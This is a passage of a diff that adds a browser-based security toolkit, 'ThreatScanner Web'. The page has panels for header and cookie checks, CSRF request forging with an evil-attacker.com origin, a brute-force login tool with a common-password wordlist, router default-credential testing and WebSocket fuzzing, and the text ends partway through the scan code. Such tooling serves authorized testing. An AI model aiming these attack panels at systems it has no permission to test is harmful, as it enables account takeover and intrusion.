@@ -1,0 +1,1643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ThreatScanner Web</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f172a;--bg2:#1e293b;--bg3:#334155;
+  --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;
+  --green:#4ade80;--yellow:#fbbf24;--red:#f87171;
+  --blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;
+  --border:#334155;--card:#1e293b;--input:#0f172a;
+}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:14px}
+.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.logo{font-size:17px;font-weight:700;color:var(--blue)}
+.logo span{color:var(--text2);font-weight:400;font-size:12px;margin-left:6px}
+.badge{background:#422006;color:var(--yellow);font-size:10px;padding:3px 8px;border-radius:4px}
+.nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 10px;display:flex;gap:4px;flex-wrap:wrap;position:sticky;top:45px;z-index:99}
+.nav-btn{padding:6px 11px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text2);font-size:12px;cursor:pointer;transition:all 0.15s}
+.nav-btn:hover{background:var(--bg3);color:var(--text)}
+.nav-btn.active{background:rgba(96,165,250,0.15);color:var(--blue);border-color:rgba(96,165,250,0.5)}
+.content{padding:12px;max-width:960px;margin:0 auto}
+.tool-panel{display:none}.tool-panel.active{display:block}
+.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:10px}
+.card-title{font-size:10px;font-weight:700;color:var(--text3);margin-bottom:12px;text-transform:uppercase;letter-spacing:0.1em}
+label{font-size:12px;color:var(--text2);display:block;margin-bottom:4px}
+input,select,textarea{width:100%;padding:8px 10px;border:1px solid var(--border);border-radius:6px;background:var(--input);color:var(--text);font-size:13px;font-family:monospace;outline:none;transition:border 0.15s}
+input:focus,select:focus,textarea:focus{border-color:var(--blue)}
+textarea{resize:vertical;min-height:70px}
+.igroup{margin-bottom:10px}
+.flex{display:flex;gap:8px;align-items:center}
+.f1{flex:1;min-width:0}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+@media(max-width:480px){.grid2{grid-template-columns:1fr}}
+.btn{padding:8px 14px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--text);font-size:13px;cursor:pointer;transition:all 0.15s;white-space:nowrap}
+.btn:hover{background:var(--bg3)}.btn:active{transform:scale(0.97)}
+.btn-blue{background:rgba(96,165,250,0.15);color:var(--blue);border-color:rgba(96,165,250,0.4)}
+.btn-blue:hover{background:rgba(96,165,250,0.25)}
+.btn-red{background:rgba(248,113,113,0.15);color:var(--red);border-color:rgba(248,113,113,0.4)}
+.btn-red:hover{background:rgba(248,113,113,0.25)}
+.btn-green{background:rgba(74,222,128,0.15);color:var(--green);border-color:rgba(74,222,128,0.4)}
+.btn-yellow{background:rgba(251,191,36,0.15);color:var(--yellow);border-color:rgba(251,191,36,0.4)}
+.btn-full{width:100%;margin-top:8px}
+.chk{display:flex;align-items:center;gap:6px;margin-bottom:6px;font-size:13px;color:var(--text2);cursor:pointer}
+.chk input{width:auto;cursor:pointer;accent-color:var(--blue)}
+.tabs{display:flex;gap:3px;margin-bottom:10px;flex-wrap:wrap}
+.tab{padding:5px 12px;border-radius:6px;border:1px solid transparent;background:transparent;color:var(--text2);font-size:12px;cursor:pointer}
+.tab.active{background:var(--bg3);color:var(--text);border-color:var(--border)}
+.tc{display:none}.tc.active{display:block}
+.output{background:#080f1f;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;min-height:160px;max-height:400px;overflow-y:auto;margin-top:8px;line-height:1.7}
+.ll{padding:1px 0;word-break:break-all}
+.ok{color:#4ade80}.warn{color:#fbbf24}.err{color:#f87171}
+.info{color:#60a5fa}.purple{color:#a78bfa}.orange{color:#fb923c}
+.dim{color:#475569}.white{color:#e2e8f0}
+.sep{color:#1e3a5f}
+/* RISK BADGES */
+.risk{display:inline-block;padding:1px 7px;border-radius:4px;font-size:10px;font-weight:700;margin-left:6px;vertical-align:middle}
+.risk-critical{background:#450a0a;color:#fca5a5}
+.risk-high{background:#431407;color:#fdba74}
+.risk-medium{background:#422006;color:#fde68a}
+.risk-low{background:#052e16;color:#86efac}
+.risk-info{background:#0c1a2e;color:#93c5fd}
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
+.stat{background:var(--bg3);border-radius:8px;padding:8px;text-align:center;display:none}
+.stat.show{display:block}
+.stat-n{font-size:20px;font-weight:700}
+.stat-l{font-size:10px;color:var(--text2);margin-top:1px}
+/* PROGRESS */
+.prog{height:3px;background:var(--border);border-radius:2px;margin-top:8px;display:none}
+.prog.show{display:block}
+.prog-bar{height:100%;background:var(--blue);border-radius:2px;width:0%;transition:width 0.3s}
+/* SELECT narrow */
+.sel-sm{width:auto;min-width:80px}
+/* METHOD COLOR */
+option{background:var(--bg2)}
+/* RESULT TABLE */
+.rtable{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
+.rtable th{padding:5px 8px;background:var(--bg3);color:var(--text2);text-align:left;font-size:11px;font-weight:600}
+.rtable td{padding:5px 8px;border-bottom:1px solid var(--border);word-break:break-all}
+.rtable tr:hover td{background:rgba(255,255,255,0.02)}
+.note{font-size:11px;color:var(--text3);padding:6px 10px;background:rgba(251,191,36,0.07);border-left:2px solid var(--yellow);border-radius:0 4px 4px 0;margin-top:8px}
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--bg3);border-radius:2px}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">⚡ ThreatScanner <span>Web Edition</span></div>
+  <span class="badge">⚠ Authorized use only</span>
+</div>
+
+<div class="nav" id="mainNav">
+  <button class="nav-btn active" onclick="go('scanner',this)">🔍 Full Scanner</button>
+  <button class="nav-btn" onclick="go('headers',this)">📋 Headers</button>
+  <button class="nav-btn" onclick="go('api',this)">🛰 API Tester</button>
+  <button class="nav-btn" onclick="go('csrf',this)">🛡 CSRF</button>
+  <button class="nav-btn" onclick="go('subdomain',this)">🌐 Subdomain</button>
+  <button class="nav-btn" onclick="go('brute',this)">🔐 Brute Force</button>
+  <button class="nav-btn" onclick="go('router',this)">📡 Router/WiFi</button>
+  <button class="nav-btn" onclick="go('ws',this)">🟠 WebSocket</button>
+  <button class="nav-btn" onclick="go('codescan',this)">🧩 Code Scan</button>
+</div>
+
+<div class="content">
+
+<!-- ══════════════ FULL SCANNER ══════════════ -->
+<div id="tool-scanner" class="tool-panel active">
+  <div class="card">
+    <div class="card-title">Full Vulnerability Scanner</div>
+    <div class="igroup">
+      <label>Target URL</label>
+      <div class="flex">
+        <input type="text" id="s-url" placeholder="https://example.com" class="f1">
+        <button class="btn btn-blue" onclick="runScan()">▶ Scan</button>
+        <button class="btn" onclick="stopAll()">■ Stop</button>
+      </div>
+    </div>
+    <div class="grid2">
+      <label class="chk"><input type="checkbox" id="c-https" checked> HTTPS / TLS</label>
+      <label class="chk"><input type="checkbox" id="c-hdr" checked> Security Headers</label>
+      <label class="chk"><input type="checkbox" id="c-cook" checked> Cookie Flags</label>
+      <label class="chk"><input type="checkbox" id="c-cors" checked> CORS Policy</label>
+      <label class="chk"><input type="checkbox" id="c-sqli" checked> SQL Injection</label>
+      <label class="chk"><input type="checkbox" id="c-xss" checked> XSS Probe</label>
+      <label class="chk"><input type="checkbox" id="c-ports" checked> Port Scan</label>
+      <label class="chk"><input type="checkbox" id="c-files" checked> Sensitive Files</label>
+    </div>
+    <div class="prog" id="s-prog"><div class="prog-bar" id="s-bar"></div></div>
+  </div>
+  <div class="stats" id="s-stats">
+    <div class="stat" id="st-c"><div class="stat-n err" id="sn-c">0</div><div class="stat-l">CRITICAL</div></div>
+    <div class="stat" id="st-h"><div class="stat-n orange" id="sn-h">0</div><div class="stat-l">HIGH</div></div>
+    <div class="stat" id="st-m"><div class="stat-n warn" id="sn-m">0</div><div class="stat-l">MEDIUM</div></div>
+    <div class="stat" id="st-l"><div class="stat-n ok" id="sn-l">0</div><div class="stat-l">LOW/INFO</div></div>
+  </div>
+  <div class="output" id="s-out"><span class="dim">Ready. Enter a URL and click Scan.</span></div>
+  <button class="btn btn-full" onclick="save('s-out','FullScan')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ HEADERS ══════════════ -->
+<div id="tool-headers" class="tool-panel">
+  <div class="card">
+    <div class="card-title">Header Analyzer</div>
+    <div class="igroup">
+      <label>Target URL</label>
+      <div class="flex">
+        <input type="text" id="h-url" placeholder="https://example.com" class="f1">
+        <button class="btn btn-blue" onclick="doHeaders()">📋 Dump Headers</button>
+      </div>
+    </div>
+  </div>
+  <div class="output" id="h-out"><span class="dim">Enter URL to dump all response headers.</span></div>
+  <button class="btn btn-full" onclick="save('h-out','Headers')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ API TESTER ══════════════ -->
+<div id="tool-api" class="tool-panel">
+  <div class="card">
+    <div class="card-title">API Tester — Postman Style</div>
+    <div class="flex" style="margin-bottom:10px">
+      <select id="a-meth" class="sel-sm">
+        <option>GET</option><option>POST</option><option>PUT</option>
+        <option>PATCH</option><option>DELETE</option><option>HEAD</option><option>OPTIONS</option>
+      </select>
+      <input type="text" id="a-url" placeholder="https://api.example.com/v1/users" class="f1">
+      <button class="btn btn-blue" onclick="doApi()">▶ Send</button>
+    </div>
+    <div class="tabs">
+      <button class="tab active" onclick="stab('api','params',this)">Params</button>
+      <button class="tab" onclick="stab('api','hdrs',this)">Headers</button>
+      <button class="tab" onclick="stab('api','body',this)">Body</button>
+      <button class="tab" onclick="stab('api','auth',this)">Auth</button>
+    </div>
+    <div id="api-params" class="tc active">
+      <label>Query Parameters (key=value, one per line)</label>
+      <textarea id="a-params" placeholder="page=1&#10;limit=20&#10;search=admin"></textarea>
+    </div>
+    <div id="api-hdrs" class="tc">
+      <label>Headers (Key: Value, one per line)</label>
+      <textarea id="a-hdrs" placeholder="Authorization: Bearer token&#10;X-Custom: value"></textarea>
+    </div>
+    <div id="api-body" class="tc">
+      <div class="flex" style="margin-bottom:8px;gap:12px">
+        <label class="chk"><input type="radio" name="btype" value="json" checked> JSON</label>
+        <label class="chk"><input type="radio" name="btype" value="form"> Form-data</label>
+        <label class="chk"><input type="radio" name="btype" value="raw"> Raw</label>
+      </div>
+      <textarea id="a-body" placeholder='{"username":"admin","password":"test123"}'></textarea>
+    </div>
+    <div id="api-auth" class="tc">
+      <div class="igroup">
+        <label>Auth Type</label>
+        <select id="a-authtype" onchange="authUI()">
+          <option value="none">No Auth</option>
+          <option value="bearer">Bearer Token</option>
+          <option value="apikey">API Key</option>
+          <option value="basic">Basic Auth</option>
+        </select>
+      </div>
+      <div id="a-authfields"></div>
+    </div>
+  </div>
+  <div class="output" id="a-out"><span class="dim">Configure request and click Send.</span></div>
+  <button class="btn btn-full" onclick="save('a-out','APITest')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ CSRF ══════════════ -->
+<div id="tool-csrf" class="tool-panel">
+  <div class="card">
+    <div class="card-title">CSRF Tester</div>
+    <div class="tabs">
+      <button class="tab active" onclick="stab('csrf','scan',this)">🔍 Scan</button>
+      <button class="tab" onclick="stab('csrf','forge',this)">⚡ Forge Request</button>
+    </div>
+    <div id="csrf-scan" class="tc active">
+      <div class="igroup">
+        <label>Target URL</label>
+        <div class="flex">
+          <input type="text" id="cs-url" placeholder="https://example.com/login" class="f1">
+          <button class="btn btn-blue" onclick="doCSRF()">▶ Scan</button>
+        </div>
+      </div>
+    </div>
+    <div id="csrf-forge" class="tc">
+      <div class="igroup">
+        <label>Endpoint URL</label>
+        <div class="flex">
+          <select id="f-meth" class="sel-sm"><option>POST</option><option>GET</option><option>PUT</option></select>
+          <input type="text" id="f-url" placeholder="https://example.com/api/action" class="f1">
+        </div>
+      </div>
+      <div class="igroup">
+        <label>Attacker Origin</label>
+        <input type="text" id="f-origin" value="https://evil-attacker.com">
+      </div>
+      <div class="igroup">
+        <label>Request Body (key=value, one per line)</label>
+        <textarea id="f-body" placeholder="username=admin&#10;action=delete&#10;target_id=1"></textarea>
+      </div>
+      <label class="chk"><input type="checkbox" id="f-omit" checked> Omit CSRF token (simulate attack)</label>
+      <div class="flex" style="margin-top:10px;gap:8px">
+        <button class="btn btn-red f1" onclick="doForge()">⚡ Send Forged</button>
+        <button class="btn btn-yellow f1" onclick="doPoc()">📄 Generate PoC</button>
+      </div>
+    </div>
+  </div>
+  <div class="output" id="cs-out"><span class="dim">Enter URL to scan for CSRF vulnerabilities.</span></div>
+  <button class="btn btn-full" onclick="save('cs-out','CSRF')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ SUBDOMAIN ══════════════ -->
+<div id="tool-subdomain" class="tool-panel">
+  <div class="card">
+    <div class="card-title">Subdomain Scanner</div>
+    <div class="igroup">
+      <label>Target Domain</label>
+      <div class="flex">
+        <input type="text" id="sd-domain" placeholder="example.com" class="f1">
+        <button class="btn btn-blue" onclick="doSub()">▶ Scan</button>
+        <button class="btn" onclick="stopAll()">■ Stop</button>
+      </div>
+    </div>
+    <div class="grid2">
+      <label class="chk"><input type="checkbox" id="sd-crt" checked> crt.sh CT Logs</label>
+      <label class="chk"><input type="checkbox" id="sd-cs" checked> CertSpotter</label>
+      <label class="chk"><input type="checkbox" id="sd-probe" checked> HTTP/HTTPS Probe</label>
+      <label class="chk"><input type="checkbox" id="sd-root" checked> Include root domain</label>
+    </div>
+  </div>
+  <div class="stats" id="sd-stats">
+    <div class="stat show" id="sd-st1"><div class="stat-n ok" id="sd-n1">0</div><div class="stat-l">Found</div></div>
+    <div class="stat show" id="sd-st2"><div class="stat-n info" id="sd-n2">0</div><div class="stat-l">Live</div></div>
+    <div class="stat show" id="sd-st3"><div class="stat-n warn" id="sd-n3">0</div><div class="stat-l">Dead</div></div>
+  </div>
+  <div class="output" id="sd-out"><span class="dim">Enter domain to discover subdomains via CT logs.</span></div>
+  <button class="btn btn-full" onclick="save('sd-out','Subdomains')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ BRUTE FORCE ══════════════ -->
+<div id="tool-brute" class="tool-panel">
+  <div class="card">
+    <div class="card-title">Brute Force Login</div>
+    <div class="igroup">
+      <label>Login URL</label>
+      <input type="text" id="b-url" placeholder="https://example.com/login">
+    </div>
+    <div class="grid2">
+      <div class="igroup">
+        <label>Username Field Value</label>
+        <input type="text" id="b-user" placeholder="admin">
+      </div>
+      <div class="igroup">
+        <label>Username Field Name</label>
+        <input type="text" id="b-ufield" placeholder="username" value="username">
+      </div>
+      <div class="igroup">
+        <label>Password Field Name</label>
+        <input type="text" id="b-pfield" placeholder="password" value="password">
+      </div>
+      <div class="igroup">
+        <label>Delay (ms)</label>
+        <input type="number" id="b-delay" value="500" min="0" max="5000">
+      </div>
+    </div>
+    <div class="igroup">
+      <label>Wordlist (one password per line)</label>
+      <textarea id="b-words" placeholder="admin&#10;password&#10;123456&#10;admin123&#10;letmein&#10;qwerty&#10;test&#10;root" style="min-height:100px"></textarea>
+    </div>
+    <div class="igroup">
+      <label>Failure keyword (to detect wrong password)</label>
+      <input type="text" id="b-fail" placeholder="invalid,incorrect,wrong,failed,error" value="invalid,incorrect,wrong,failed,error,unauthorized">
+    </div>
+    <div class="flex" style="gap:8px;margin-top:8px">
+      <button class="btn btn-red f1" onclick="doBrute()">▶ Start Attack</button>
+      <button class="btn f1" onclick="stopAll()">■ Stop</button>
+    </div>
+  </div>
+  <div class="note">⚠ For authorized penetration testing only. Unauthorized use is illegal.</div>
+  <div class="output" id="b-out"><span class="dim">Configure and start attack.</span></div>
+  <button class="btn btn-full" onclick="save('b-out','BruteForce')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ ROUTER/WIFI ══════════════ -->
+<div id="tool-router" class="tool-panel">
+  <div class="card">
+    <div class="card-title">Router / WiFi Security</div>
+    <div class="tabs">
+      <button class="tab active" onclick="stab('rtr','scan',this)">🔍 Router Scan</button>
+      <button class="tab" onclick="stab('rtr','deflogin',this)">🔐 Default Login</button>
+      <button class="tab" onclick="stab('rtr','netinfo',this)">📡 Network Info</button>
+    </div>
+    <div id="rtr-scan" class="tc active">
+      <div class="igroup">
+        <label>Router IP (blank = auto-detect common IPs)</label>
+        <div class="flex">
+          <input type="text" id="r-ip" placeholder="192.168.1.1" class="f1">
+          <button class="btn btn-blue" onclick="doRouter()">▶ Scan</button>
+        </div>
+      </div>
+      <label class="chk"><input type="checkbox" id="r-ports" checked> Scan common ports</label>
+      <label class="chk"><input type="checkbox" id="r-admin" checked> Find admin panels</label>
+      <label class="chk"><input type="checkbox" id="r-hdrs" checked> Check security headers</label>
+    </div>
+    <div id="rtr-deflogin" class="tc">
+      <div class="igroup">
+        <label>Router Admin URL</label>
+        <input type="text" id="r-loginurl" placeholder="http://192.168.1.1">
+      </div>
+      <p class="note">Tests top 20 default router credentials (admin:admin, admin:password, etc.)</p>
+      <button class="btn btn-red btn-full" onclick="doDefLogin()">▶ Test Default Credentials</button>
+    </div>
+    <div id="rtr-netinfo" class="tc">
+      <button class="btn btn-blue btn-full" onclick="doNetInfo()">📡 Get Network Info</button>
+      <p style="font-size:12px;color:var(--text2);margin-top:8px">Gets public IP, local IP via WebRTC leak, ISP, location, connection type.</p>
+    </div>
+  </div>
+  <div class="output" id="r-out"><span class="dim">Select a tab and start scanning.</span></div>
+  <button class="btn btn-full" onclick="save('r-out','RouterScan')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ WEBSOCKET ══════════════ -->
+<div id="tool-ws" class="tool-panel">
+  <div class="card">
+    <div class="card-title">WebSocket Tester</div>
+    <div class="igroup">
+      <label>WebSocket URL</label>
+      <div class="flex">
+        <input type="text" id="ws-url" placeholder="wss://echo.websocket.org" class="f1">
+        <button class="btn btn-green" onclick="wsConn()">▶ Connect</button>
+        <button class="btn btn-red" onclick="wsDisc()" id="ws-disc" disabled>■ Disc</button>
+      </div>
+    </div>
+    <div id="ws-status" style="font-size:12px;color:var(--text2);margin-bottom:8px;padding:4px 8px;background:var(--bg3);border-radius:4px">● Disconnected</div>
+    <div class="tabs">
+      <button class="tab active" onclick="stab('ws','send',this)">📤 Send</button>
+      <button class="tab" onclick="stab('ws','fuzz',this)">🎯 Fuzz</button>
+      <button class="tab" onclick="stab('ws','hdr',this)">🔑 Headers</button>
+    </div>
+    <div id="ws-send" class="tc active">
+      <textarea id="ws-msg" placeholder='{"type":"ping","data":"hello world"}'></textarea>
+      <div class="flex" style="margin-top:8px">
+        <label class="chk f1"><input type="checkbox" id="ws-bin"> Send as Binary (hex)</label>
+        <button class="btn btn-blue" onclick="wsSend()" id="ws-sbtn" disabled>📤 Send</button>
+      </div>
+    </div>
+    <div id="ws-fuzz" class="tc">
+      <label>Fuzz Template (use §FUZZ§ as marker)</label>
+      <textarea id="ws-ftmpl" placeholder='{"action":"§FUZZ§","data":"test"}'></textarea>
+      <div class="igroup" style="margin-top:8px">
+        <label>Delay between payloads (ms)</label>
+        <input type="number" id="ws-fdelay" value="300" min="0">
+      </div>
+      <button class="btn btn-red btn-full" onclick="wsFuzz()" id="ws-fbtn" disabled>🎯 Start Fuzz</button>
+    </div>
+    <div id="ws-hdr" class="tc">
+      <label>Custom Headers (Key: Value, one per line)</label>
+      <textarea id="ws-hdrs" placeholder="Authorization: Bearer token&#10;X-Custom: value"></textarea>
+      <p class="note" style="margin-top:8px">Note: Custom headers apply on next Connect.</p>
+    </div>
+  </div>
+  <div class="output" id="ws-out"><span class="dim">Connect to a WebSocket endpoint first.</span></div>
+  <button class="btn btn-full" onclick="save('ws-out','WebSocket')">💾 Save Report</button>
+</div>
+
+<!-- ══════════════ CODE SCAN ══════════════ -->
+<div id="tool-codescan" class="tool-panel">
+  <div class="card">
+    <div class="card-title">Static Code Scanner</div>
+    <div class="igroup">
+      <label>Paste source code, or load a file — nothing leaves your browser, this runs entirely client-side</label>
+      <textarea id="cs-code" placeholder="Paste Python (or other) source code here…" style="min-height:170px"></textarea>
+    </div>
+    <div class="flex">
+      <input type="file" id="cs-file" class="f1" accept=".py,.js,.php,.rb,.go,.java,.txt,.env,.yml,.yaml">
+      <button class="btn" onclick="loadCodeFile()">📂 Load File</button>
+    </div>
+    <button class="btn btn-blue btn-full" onclick="runCodeScan()">▶ Scan Code</button>
+  </div>
+  <div class="stats" id="cs-stats">
+    <div class="stat" id="cst-c"><div class="stat-n err" id="csn-c">0</div><div class="stat-l">CRITICAL</div></div>
+    <div class="stat" id="cst-h"><div class="stat-n orange" id="csn-h">0</div><div class="stat-l">HIGH</div></div>
+    <div class="stat" id="cst-m"><div class="stat-n warn" id="csn-m">0</div><div class="stat-l">MEDIUM</div></div>
+    <div class="stat" id="cst-l"><div class="stat-n ok" id="csn-l">0</div><div class="stat-l">LOW/INFO</div></div>
+  </div>
+  <div class="output" id="cs-out"><span class="dim">Paste code or load a file, then click Scan Code.</span></div>
+  <button class="btn btn-full" onclick="save('cs-out','CodeScan')">💾 Save Report</button>
+</div>
+
+</div><!-- /content -->
+
+<script>
+'use strict';
+// ══════════════════════════════════════════
+// GLOBALS
+// ══════════════════════════════════════════
+let stopped=false;
+let wsSocket=null;
+let sc={c:0,h:0,m:0,l:0};
+let sdCounts={found:0,live:0,dead:0};
+
+// ══════════════════════════════════════════
+// UI
+// ══════════════════════════════════════════
+function go(name,btn){
+  document.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tool-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+function stab(tool,tab,btn){
+  const prefix=tool+'-';
+  document.querySelectorAll('[id^="'+prefix+'"]').forEach(el=>{
+    if(el.classList.contains('tc'))el.classList.remove('active');
+  });
+  document.getElementById(prefix+tab).classList.add('active');
+  btn.closest('.card').querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+}
+function clr(id){document.getElementById(id).innerHTML='<span class="dim">Cleared.</span>';}
+function stopAll(){stopped=true;if(wsSocket){wsSocket.close();wsSocket=null;}}
+
+function L(id,msg,cls='white'){
+  const el=document.getElementById(id);
+  if(el.querySelector('.dim'))el.innerHTML='';
+  const d=document.createElement('div');
+  d.className='ll '+cls;
+  d.textContent=msg;
+  el.appendChild(d);
+  el.scrollTop=el.scrollHeight;
+}
+function SEP(id){L(id,'────────────────────────────────────','sep');}
+function risk(level){
+  const map={CRITICAL:'risk risk-critical',HIGH:'risk risk-high',MEDIUM:'risk risk-medium',LOW:'risk risk-low',INFO:'risk risk-info'};
+  return '<span class="'+(map[level]||'risk risk-info')+'">'+level+'</span>';
+}
+function Lrisk(id,msg,level,cls){
+  const el=document.getElementById(id);
+  if(el.querySelector('.dim'))el.innerHTML='';
+  const d=document.createElement('div');
+  d.className='ll '+(cls||'white');
+  d.innerHTML=msg+risk(level);
+  el.appendChild(d);
+  el.scrollTop=el.scrollHeight;
+  // update stats
+  if(id==='s-out'){
+    document.querySelectorAll('.stat').forEach(s=>s.classList.add('show'));
+    if(level==='CRITICAL'){sc.c++;document.getElementById('sn-c').textContent=sc.c;}
+    else if(level==='HIGH'){sc.h++;document.getElementById('sn-h').textContent=sc.h;}
+    else if(level==='MEDIUM'){sc.m++;document.getElementById('sn-m').textContent=sc.m;}
+    else{sc.l++;document.getElementById('sn-l').textContent=sc.l;}
+  }
+}
+function prog(id,pct){
+  const p=document.getElementById(id+'-prog');
+  const b=document.getElementById(id+'-bar');
+  if(!p||!b)return;
+  if(pct>0){p.classList.add('show');}else{p.classList.remove('show');}
+  b.style.width=pct+'%';
+}
+function save(id,name){
+  const el=document.getElementById(id);
+  const txt=el.innerText;
+  const blob=new Blob([txt],{type:'text/plain'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download='ThreatScanner_'+name+'_'+new Date().toISOString().slice(0,10)+'.txt';
+  a.click();
+}
+
+// ══════════════════════════════════════════
+// FETCH HELPER — tries direct then CORS proxy
+// ══════════════════════════════════════════
+async function req(url,opts={},timeout=10000){
+  const sig=AbortSignal.timeout(timeout);
+  try{
+    return await fetch(url,{...opts,signal:sig});
+  }catch(e){
+    try{
+      const proxy='https://corsproxy.io/?'+encodeURIComponent(url);
+      return await fetch(proxy,{...opts,signal:AbortSignal.timeout(timeout+3000)});
+    }catch(e2){
+      throw new Error('Unreachable: '+e.message);
+    }
+  }
+}
+function norm(u){
+  u=u.trim();
+  if(!u.startsWith('http'))u='https://'+u;
+  return u;
+}
+
+// ══════════════════════════════════════════
+// FULL SCANNER
+// ══════════════════════════════════════════
+async function runScan(){
+  let url=document.getElementById('s-url').value.trim();
+  if(!url){alert('Enter a URL');return;}
+  url=norm(url);
+  stopped=false;
+  sc={c:0,h:0,m:0,l:0};
+  document.getElementById('s-out').innerHTML='';
+  document.getElementById('sn-c').textContent='0';
+  document.getElementById('sn-h').textContent='0';
+  document.getElementById('sn-m').textContent='0';
+  document.getElementById('sn-l').textContent='0';
+  prog('s',5);
+
+  const now=new Date().toLocaleString();
+  L('s-out','ThreatScanner Web — '+now,'dim');
+  L('s-out','Target: '+url,'info');
+  SEP('s-out');
+
+  // ── 1. HTTPS
+  if(document.getElementById('c-https').checked){
+    L('s-out','[HTTPS / TLS Check]','info');
+    const secure=url.startsWith('https://');
+    if(secure){
+      Lrisk('s-out','✅ HTTPS: Connection is encrypted','LOW','ok');
+    }else{
+      Lrisk('s-out','🚨 HTTP: Plain text — all data can be intercepted by MITM!','HIGH','err');
+      L('s-out','   → FIX: Install SSL/TLS certificate and redirect HTTP to HTTPS','warn');
+    }
+    // Check HSTS
+    try{
+      const r=await req(url);
+      const hsts=r.headers.get('strict-transport-security');
+      if(hsts){
+        Lrisk('s-out','✅ HSTS: '+hsts,'LOW','ok');
+      }else{
+        Lrisk('s-out','⚠️ HSTS: Missing — browser may not enforce HTTPS','MEDIUM','warn');
+        L('s-out','   → FIX: Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains','dim');
+      }
+    }catch(e){}
+    SEP('s-out');
+  }
+  prog('s',18);if(stopped)return fin('s-out');
+
+  // ── 2. SECURITY HEADERS
+  if(document.getElementById('c-hdr').checked){
+    L('s-out','[Security Headers]','info');
+    try{
+      const r=await req(url);
+      const checks=[
+        ['content-security-policy','CSP','Prevents XSS and data injection','MEDIUM'],
+        ['x-frame-options','X-Frame-Options','Prevents clickjacking attacks','MEDIUM'],
+        ['x-content-type-options','X-Content-Type-Options','Prevents MIME type sniffing','LOW'],
+        ['strict-transport-security','HSTS','Forces HTTPS connections','MEDIUM'],
+        ['referrer-policy','Referrer-Policy','Controls referrer information leakage','LOW'],
+        ['permissions-policy','Permissions-Policy','Restricts browser feature access','LOW'],
+        ['cross-origin-opener-policy','COOP','Isolates browsing context','LOW'],
+        ['cross-origin-resource-policy','CORP','Restricts cross-origin reads','LOW'],
+      ];
+      for(const[hdr,name,desc,lvl]of checks){
+        const val=r.headers.get(hdr);
+        if(val){
+          Lrisk('s-out','✅ '+name+': '+val.substring(0,80)+(val.length>80?'...':''),'LOW','ok');
+        }else{
+          Lrisk('s-out','⚠️ '+name+' MISSING — '+desc,''+lvl,'warn');
+          L('s-out','   → FIX: Add response header: '+hdr,'dim');
+        }
+      }
+      // Server header leakage
+      const srv=r.headers.get('server');
+      if(srv){
+        Lrisk('s-out','⚠️ Server header exposed: '+srv+' (reveals server info to attackers)','MEDIUM','warn');
+        L('s-out','   → FIX: Configure server to hide/remove Server header','dim');
+      }else{
+        Lrisk('s-out','✅ Server header: Hidden','LOW','ok');
+      }
+      const xpb=r.headers.get('x-powered-by');
+      if(xpb){
+        Lrisk('s-out','⚠️ X-Powered-By exposed: '+xpb,'MEDIUM','warn');
+        L('s-out','   → FIX: Remove X-Powered-By header from server config','dim');
+      }
+    }catch(e){L('s-out','⚠️ Headers check failed: '+e.message,'warn');}
+    SEP('s-out');
+  }
+  prog('s',32);if(stopped)return fin('s-out');
+
+  // ── 3. COOKIES
+  if(document.getElementById('c-cook').checked){
+    L('s-out','[Cookie Security Flags]','info');
+    try{
+      const r=await req(url);
+      const sc2=r.headers.get('set-cookie');
+      if(!sc2){
+        L('s-out','ℹ️ No Set-Cookie headers on this response','dim');
+      }else{
+        const cookies=sc2.split(/,(?=[^ ])/);
+        for(const cookie of cookies){
+          const name=(cookie.split('=')[0]||'').trim();
+          const lo=cookie.toLowerCase();
+          L('s-out','🍪 Cookie: '+name,'purple');
+          const ho=lo.includes('httponly');
+          const sec=lo.includes('secure');
+          const ssStrict=lo.includes('samesite=strict');
+          const ssLax=lo.includes('samesite=lax');
+          const ssNone=lo.includes('samesite=none');
+          const hasSS=ssStrict||ssLax||ssNone;
+          if(ho){Lrisk('s-out','  ✅ HttpOnly: Yes — XSS cannot steal this cookie','LOW','ok');}
+          else{Lrisk('s-out','  🚨 HttpOnly: MISSING — cookie accessible via JavaScript (XSS risk)','HIGH','err');L('s-out','     → FIX: Add HttpOnly flag to Set-Cookie header','dim');}
+          if(sec){Lrisk('s-out','  ✅ Secure: Yes — only sent over HTTPS','LOW','ok');}
+          else{Lrisk('s-out','  ⚠️ Secure: MISSING — cookie sent over HTTP too','MEDIUM','warn');L('s-out','     → FIX: Add Secure flag to Set-Cookie header','dim');}
+          if(ssStrict){Lrisk('s-out','  ✅ SameSite: Strict — best CSRF protection','LOW','ok');}
